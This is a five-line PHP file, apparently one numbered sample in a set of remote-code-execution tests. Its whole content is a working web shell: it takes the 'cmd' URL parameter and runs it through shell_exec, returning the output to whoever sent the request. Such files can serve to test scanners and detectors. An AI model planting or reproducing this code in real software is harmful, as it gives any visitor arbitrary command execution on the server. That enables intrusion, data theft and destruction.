<?php
// RCE test variation #324
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>